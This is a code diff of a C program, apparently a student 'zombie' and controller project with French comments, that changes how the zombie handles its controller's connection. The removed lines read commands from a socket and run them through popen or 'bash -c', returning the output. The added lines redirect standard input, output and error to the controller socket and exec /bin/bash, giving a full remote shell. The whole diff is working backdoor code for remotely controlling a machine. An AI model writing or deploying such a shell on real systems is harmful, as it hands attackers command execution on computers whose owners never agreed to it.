@@ -17,46 +17,13 @@ void endHandler(int sig)
 }
 
 void zombieFils(void* sockfdController){
-    while(!end){
-        int *sockfd = sockfdController;
+    int* sockfd = sockfdController;
 
-        dup2(*sockfd, STDOUT_FILENO);
-        dup2(*sockfd, STDERR_FILENO);
-        
-        char commande[1024];
-        memset(commande, 0, sizeof(commande));
-        sread(*sockfd, commande, sizeof(commande) - 1);
+    dup2(*sockfd, STDOUT_FILENO);
+    dup2(*sockfd, STDERR_FILENO);
+    dup2(*sockfd,STDIN_FILENO);
 
-        FILE *fp = popen(commande, "r");
-        if (fp == NULL) {
-            perror("popen");
-            exit(EXIT_FAILURE);
-        }
-
-        char output[1024];
-        while (fgets(output, sizeof(output), fp) != NULL) {
-            write(*sockfd, output, strlen(output));
-        }
-        pclose(fp);
-
-        dup2(STDOUT_FILENO, *sockfd);
-        dup2(STDERR_FILENO, *sockfd);
-    }
-    /*while(!end){
-        int *sockfd = sockfdController;
-
-        dup2(*sockfd, STDOUT_FILENO);
-        dup2(*sockfd, STDERR_FILENO);
-        
-        char commande[1024];
-        memset(commande, 0, sizeof(commande));
-        sread(*sockfd, commande, sizeof(commande) - 1);
-
-        execlp("/bin/bash", "bash", "-c", commande, NULL);
-        
-        dup2(STDOUT_FILENO, *sockfd);
-        dup2(STDERR_FILENO, *sockfd);
-    }*/
+    sexecl("/bin/bash", "bash", NULL);
 }
 
 int main(int argc, char *argv[]){
@@ -64,6 +31,7 @@ int main(int argc, char *argv[]){
 
     int sockfd = initSocketZombie();
 
+    // on considere qu'il n'y a qu'un seul controller ici
     int sockfdController;
     
     while(!end){
